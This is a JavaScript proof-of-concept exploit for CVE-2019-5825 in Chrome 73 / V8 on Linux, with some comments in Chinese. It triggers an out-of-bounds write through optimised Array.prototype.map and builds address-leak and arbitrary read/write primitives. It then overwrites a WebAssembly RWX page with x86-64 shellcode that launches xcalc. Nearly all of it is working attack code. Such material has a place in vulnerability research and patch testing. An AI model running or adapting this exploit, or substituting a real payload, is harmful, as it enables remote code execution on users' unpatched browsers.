/*
  CVE-2019-5825 exp
  Chrome 73.0.3683.75 on Linux x64
  V8 version 7.3.492.22
*/

var is_debug = false;

function gc() {
  for (var i = 0; i < 0x10; i++) {
    new ArrayBuffer(0x1000000);
  }
}

var f64 = new Float64Array(1);
var u32 = new Uint32Array(f64.buffer);
function d2u(v) {
  f64[0] = v;
  return u32;
}
function u2d(lo, hi) {
  u32[0] = lo;
  u32[1] = hi;
  return f64[0];
}

function hex(lo, hi) {
  if (lo == 0) {
    return ("0x" + hi.toString(16) + "00000000");
  }
  if (hi == 0) {
    return ("0x" + lo.toString(16));
  }
  return ("0x" + ('00000000' + hi.toString(16)).substr(8) + ('00000000' + lo.toString(16)).substr(8));
}

function breakpoint() {
  if (is_debug) {
    // b builtins-math.cc:20
    Math.hypot(3, 4);
  }
}

function log(msg) {
  console.log(msg);
}

function dlog(msg) {
  if (is_debug) {
    console.log(msg);
  }
}

function v8_dprint(msg) {
  if (is_debug) {
    %DebugPrint(msg);
  }
}

// This call ensures that TurboFan won't inline array constructors.
Array(2**16);

var kMaxFastArrayLength = 32 * 1024 * 1024;
var FLOAT_ARRAY_OFFSET = 20;
var FLOAT_ARRAY_ELEMENTS_OFFSET = FLOAT_ARRAY_OFFSET - 4;
var LIMIT_OFFSET = FLOAT_ARRAY_OFFSET + 4;

var arr = [1, 2, ,,, 3];
var float_array = null;

var leak_array;
var leaked_index;
var backing_store_idx;
var backing_store;

function mapping(a) {
  function f(elem, idx) {
    if (idx == 0) {
      float_array = [1.1, 2.2];
      leak_array = [0x4141, 0x4242, {}];
    }
    if (idx >= LIMIT_OFFSET) {
      throw "error";
    }
    return elem;
  }

  return a.map(f);
}

for (var i = 0; i < 100000; i++) {
  mapping(arr);
}

var t = d2u(2.2);
dlog(hex(t[0], t[1]));

arr.length = kMaxFastArrayLength - 1;
// 为arr填充值，注意避开float_array的Map, Properties和Elements字段
arr.fill(1, 0, FLOAT_ARRAY_ELEMENTS_OFFSET);
arr.fill(1, FLOAT_ARRAY_ELEMENTS_OFFSET + 1, FLOAT_ARRAY_ELEMENTS_OFFSET + 2);
arr.fill(1, FLOAT_ARRAY_OFFSET + 3);
// arr.push(2);
arr.length += 2;

try {
  mapping(arr); // 触发漏洞OOB write，覆盖float_array的Length字段
} catch (e) {}

if (float_array.length == 0x3ff00000) {
  log("[*] OOB Write float_array length success!");
}

v8_dprint(leak_array);
breakpoint();

log("[*] Leaking index...");
for (var i = 0; i < 0x10000; i++) {
  if (float_array[i] == u2d(0, 0x4141) && float_array[i+1] == u2d(0, 0x4242)) {
    leaked_index = i;
    break;
  }
}
log("[*] Leaked index: " + leaked_index);

var addrof = function (obj) {
  leak_array[0] = obj;
  return d2u(float_array[leaked_index]);
}

var arr_buf = new ArrayBuffer(0x1230);
for (var i = 0; i < 0x10000; i++) {
  if (float_array[i] == u2d(0x1230, 0)) {
    backing_store_idx = i + 1;
    backing_store = float_array[backing_store_idx];
    break;
  }
}
var t = d2u(backing_store);
log("[*] JSArrayBuffer backing store: " + hex(t[0], t[1]));
breakpoint();

function read8(addr) {
  float_array[backing_store_idx] = addr;
  return new Uint32Array(arr_buf);
}

function wasm_func() {
  var importObject = {
    imports: { imported_func: arg => console.log(arg) }
  };
  bc = [0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x08, 0x02, 0x60, 0x01, 0x7f, 0x00, 0x60, 0x00, 0x00, 0x02, 0x19, 0x01, 0x07, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x73, 0x0d, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x00, 0x00, 0x03, 0x02, 0x01, 0x01, 0x07, 0x11, 0x01, 0x0d, 0x65, 0x78, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x00, 0x01, 0x0a, 0x08, 0x01, 0x06, 0x00, 0x41, 0x2a, 0x10, 0x00, 0x0b];
  var wasm_code = new Uint8Array(bc);
  var wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), importObject);
  return wasm_mod.exports.exported_func;
}

var func = wasm_func();
var func_addr = addrof(func);
log("[*] WASM func addr: " + hex(func_addr[0]-1, func_addr[1]));
var sfi = read8(u2d(func_addr[0] + 0x18 - 1, func_addr[1]));
log("[*] sfi: " + hex(sfi[0] - 1, sfi[1]));
var WasmExportedFunctionData = read8(u2d(sfi[0] + 0x8 - 1, sfi[1]));
log("[*] WasmExporotedFunctionData: " + hex(WasmExportedFunctionData[0] - 1, WasmExportedFunctionData[1]));
var instance = read8(u2d(WasmExportedFunctionData[0] + 0x10 - 1, WasmExportedFunctionData[1]));
log("[*] instance: " + hex(instance[0] - 1, instance[1]));
var rwx = read8(u2d(instance[0] + 0xf8 - 1, instance[1]));
log("[*] rwx: " + hex(rwx[0], rwx[1]));

// set shellcode
float_array[backing_store_idx] = u2d(rwx[0], rwx[1]);
var shellcode = [].concat([
  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x48, 0xb8, 
  0x2f, 0x78, 0x63, 0x61, 0x6c, 0x63, 0x00, 0x00, 0x50, 0x48, 
  0xb8, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x50, 
  0x48, 0x89, 0xe7, 0x48, 0x31, 0xc0, 0x50, 0x57, 0x48, 0x89, 
  0xe6, 0x48, 0x31, 0xd2, 0x48, 0xc7, 0xc0, 0x3a, 0x30, 0x00, 
  0x00, 0x50, 0x48, 0xb8, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 
  0x59, 0x3d, 0x50, 0x48, 0x89, 0xe2, 0x48, 0x31, 0xc0, 0x50, 
  0x52, 0x48, 0x89, 0xe2, 0x48, 0xc7, 0xc0, 0x3b, 0x00, 0x00, 
  0x00, 0x0f, 0x05]);
(new Uint8Array(arr_buf)).set(shellcode, 0);

func();

breakpoint();
